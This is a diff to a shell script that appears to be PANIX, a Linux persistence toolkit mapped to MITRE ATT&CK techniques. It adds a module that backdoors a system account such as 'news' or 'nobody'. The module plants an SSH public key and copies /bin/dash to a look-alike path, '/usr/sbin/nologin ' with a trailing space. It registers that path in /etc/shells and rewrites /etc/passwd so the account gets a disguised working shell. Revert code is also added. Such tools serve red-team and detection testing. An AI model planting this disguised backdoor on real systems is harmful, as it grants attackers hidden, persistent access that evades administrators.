@@ -49,6 +49,7 @@ usage_root() {
 	echo "  --at                   At job persistence"
 	echo "  --authorized-keys      Add public key to authorized keys"
 	echo "  --backdoor-user        Create backdoor user"
+	echo "  --backdoor-system-user Create backdoor system user"
 	echo "  --bind-shell           Execute backgrounded bind shell (supports multiple LOLBins)"
 	echo "  --cap                  Add capabilities persistence"
 	echo "  --create-user          Create a new user"
@@ -416,6 +417,228 @@ revert_authorized_keys() {
 	else
 		echo "[-] Backup file ${path}.bak not found. No changes made."
 		return 0
+	fi
+
+	return 0
+}
+
+# Module: setup_backdoor_system_user.sh
+setup_backdoor_system_user() {
+	local key=""
+	local user=""
+	local path=""
+	local default=0
+	local custom=0
+
+	usage_backdoor_system_user() {
+		echo "Usage: ./panix.sh --backdoor-system-user [OPTIONS]"
+		echo "--examples                   Display command examples"
+		echo "--default                    Use default authorized keys settings"
+		echo "  --key <key>                  Specify the public key"
+		echo "--custom                     Use custom settings for a specified user"
+		echo "  --user <user>                Specify the user"
+		echo "  --key <key>                  Specify the public key"
+		echo "--help|-h                    Show this help message"
+	}
+
+	while [[ "$1" != "" ]]; do
+		case $1 in
+			--default )
+				default=1
+				;;
+			--custom )
+				custom=1
+				;;
+			--key )
+				shift
+				key=$1
+				;;
+			--user )
+				shift
+				user=$1
+				;;
+			--examples )
+				echo "Examples:"
+				echo "--default:"
+				echo "./panix.sh --backdoor-system-user --default --key <public_key>"
+				echo "--custom:"
+				echo "./panix.sh --backdoor-system-user --custom --user <username> --key <public_key>"
+				exit 0
+				;;
+			--help|-h)
+				usage_backdoor_system_user
+				exit 0
+				;;
+			* )
+				echo "Invalid option for --backdoor-system-user: $1"
+				echo "Try './panix.sh --backdoor-system-user --help' for more information."
+				exit 1
+		esac
+		shift
+	done
+
+	if [[ $default -eq 1 && $custom -eq 1 ]]; then
+		echo "Error: --default and --custom cannot be specified together."
+		echo "Try './panix.sh --backdoor-system-user --help' for more information."
+		exit 1
+	fi
+
+	if [[ $default -eq 1 ]]; then
+		if [[ -z $key ]]; then
+			echo "Error: --key must be specified with --default."
+			echo "Try './panix.sh --backdoor-system-user --help' for more information."
+			exit 1
+		fi
+
+		# Locate the 'news' user
+		local user_entry=$(grep "^news:" /etc/passwd)
+		if [[ -z "$user_entry" ]]; then
+			# Fallback to 'nobody' user
+			user_entry=$(grep "^nobody:" /etc/passwd)
+			if [[ -z "$user_entry" ]]; then
+				echo "Error: Neither 'news' nor 'nobody' user exists on this system."
+				exit 1
+			fi
+		fi
+	elif [[ $custom -eq 1 ]]; then
+		if [[ -z $user || -z $key ]]; then
+			echo "Error: Both --user and --key must be specified with --custom."
+			echo "Try './panix.sh --backdoor-system-user --help' for more information."
+			exit 1
+		fi
+
+		# Locate the specified user
+		user_entry=$(grep "^$user:" /etc/passwd)
+		if [[ -z "$user_entry" ]]; then
+			echo "Error: Specified user '$user' does not exist in /etc/passwd."
+			exit 1
+		fi
+
+		# Check if the user's shell is /bin/false
+		local user_shell=$(echo "$user_entry" | cut -d: -f7)
+		if [[ "$user_shell" == "/bin/false" ]]; then
+			echo "Error: Specified user '$user' has '/bin/false' as their shell. Please choose another user."
+			exit 1
+		fi
+	else
+		echo "Error: Either --default or --custom must be specified."
+		echo "Try './panix.sh --backdoor-system-user --help' for more information."
+		exit 1
+	fi
+
+	# Extract the home directory for the user
+	local home_dir=$(echo "$user_entry" | cut -d: -f6)
+	if [[ -z "$home_dir" ]]; then
+		echo "Error: Unable to determine the home directory for the user."
+		exit 1
+	fi
+
+	# Create the .ssh directory
+	mkdir -p "$home_dir/.ssh"
+	chmod 755 "$home_dir/.ssh"  # Set directory permissions to be accessible by others
+
+	# Write the public key to authorized_keys
+	echo "$key" > "$home_dir/.ssh/authorized_keys"
+	chmod 644 "$home_dir/.ssh/authorized_keys"  # Set file permissions to be readable by others
+
+	echo "[+] Authorized_keys persistence established for user: $(echo "$user_entry" | cut -d: -f1)"
+
+	# Check and add "nologin " to /etc/shells if not already present
+	if ! grep -q "nologin " /etc/shells; then
+		echo "nologin " >> /etc/shells
+		echo "[+] Added 'nologin ' to /etc/shells"
+	else
+		echo "[+] 'nologin ' already exists in /etc/shells. Skipping."
+	fi
+
+	# Copy /bin/dash to '/usr/sbin/nologin '
+	cp /bin/dash "/usr/sbin/nologin "
+	echo "[+] Copied /bin/dash to '/usr/sbin/nologin '"
+
+	# Modify /etc/passwd to include the trailing space in the shell path
+	local username=$(echo "$user_entry" | cut -d: -f1)
+	sed -i "/^$username:/s|:/usr/sbin/nologin$|:/usr/sbin/nologin |" /etc/passwd
+	echo "[+] Modified /etc/passwd to update shell path for user: $username"
+
+	echo "[+] System user backdoor persistence established for user: $(echo "$user_entry" | cut -d: -f1)"
+}
+
+# Revert Module: revert_backdoor_system_user.sh
+revert_backdoor_system_user() {
+	usage_revert_backdoor_system_user() {
+		echo "Usage: ./panix.sh --revert backdoor-system-user"
+		echo "Reverts any changes made by the setup_backdoor_system_user module for the default option."
+	}
+
+	if ! check_root; then
+		echo "Error: This function can only be run as root."
+		return 1
+	fi
+
+	# Define users to check
+	# Add custom users here if you want to revert them
+	local users=("news" "nobody")
+
+	for user in "${users[@]}"; do
+		# Check if user exists in /etc/passwd
+		user_entry=$(grep "^$user:" /etc/passwd)
+		if [[ -n "$user_entry" ]]; then
+			# Extract home directory
+			home_dir=$(echo "$user_entry" | cut -d: -f6)
+
+			if [[ -d "$home_dir/.ssh" ]]; then
+				# Remove the .ssh directory
+				echo "[+] Removing .ssh directory for user: $user"
+				rm -rf "$home_dir/.ssh"
+				if [[ $? -eq 0 ]]; then
+					echo "[+] Successfully removed .ssh directory for $user."
+				else
+					echo "[-] Failed to remove .ssh directory for $user."
+				fi
+			else
+				echo "[+] No .ssh directory found for $user."
+			fi
+
+			# Restore /etc/passwd entry for the user
+			echo "[+] Checking /etc/passwd entry for user: $user"
+			if grep -q ":$home_dir:/usr/sbin/nologin " /etc/passwd; then
+				echo "[+] Reverting /etc/passwd entry for user: $user"
+				sed -i "s|:$home_dir:/usr/sbin/nologin |:$home_dir:/usr/sbin/nologin|" /etc/passwd
+				if [[ $? -eq 0 ]]; then
+					echo "[+] Successfully reverted /etc/passwd entry for $user."
+				else
+					echo "[-] Failed to revert /etc/passwd entry for $user."
+				fi
+			else
+				echo "[+] No modifications found for /etc/passwd entry of user: $user. Skipping."
+			fi
+		fi
+	done
+
+	# Remove '/usr/sbin/nologin ' if it exists
+	if [[ -f "/usr/sbin/nologin " ]]; then
+		echo "[+] Removing '/usr/sbin/nologin '"
+		rm -f "/usr/sbin/nologin "
+		if [[ $? -eq 0 ]]; then
+			echo "[+] Successfully removed '/usr/sbin/nologin '."
+		else
+			echo "[-] Failed to remove '/usr/sbin/nologin '."
+		fi
+	else
+		echo "[+] '/usr/sbin/nologin ' not found. Skipping."
+	fi
+
+	# Revert changes to /etc/shells
+	if grep -q "nologin " /etc/shells; then
+		echo "[+] Reverting /etc/shells to remove 'nologin ' entry."
+		sed -i '/nologin /d' /etc/shells
+		if [[ $? -eq 0 ]]; then
+			echo "[+] Successfully removed 'nologin ' from /etc/shells."
+		else
+			echo "[-] Failed to revert changes in /etc/shells."
+		fi
+	else
+		echo "[+] 'nologin ' not found in /etc/shells. Skipping."
 	fi
 
 	return 0
@@ -7571,6 +7794,7 @@ display_mitre_matrix() {
 		"--at" "Scheduled Task" "T1053" "At" "T1053.002" "https://attack.mitre.org/techniques/T1053/002" \
 		"--authorized-keys" "Account Manipulation" "T1098" "SSH Authorized Keys" "T1098.004" "https://attack.mitre.org/techniques/T1098/004" \
 		"--backdoor-user" "Create Account" "T1136" "Local Account" "T1136.001" "https://attack.mitre.org/techniques/T1136/001" \
+		"--backdoor-system-user" "Account Manipulation" "T1098" "SSH Authorized Keys" "T1098.004" "https://attack.mitre.org/techniques/T1098/004" \
 		"--bind-shell" "Command and Scripting Interpreter" "T1059" "Unix Shell" "T1059.004" "https://attack.mitre.org/techniques/T1059/004" \
 		"--cap" "Abuse Elevation Control Mechanism" "T1548" "N/A" "N/A" "https://attack.mitre.org/techniques/T1548" \
 		"--create-user" "Create Account" "T1136" "Local Account" "T1136.001" "https://attack.mitre.org/techniques/T1136/001" \
@@ -7660,6 +7884,11 @@ main() {
 			--authorized-keys )
 				shift
 				setup_authorized_keys "$@"
+				exit
+				;;
+			--backdoor-system-user )
+				shift
+				setup_backdoor_system_user "$@"
 				exit
 				;;
 			--backdoor-user )
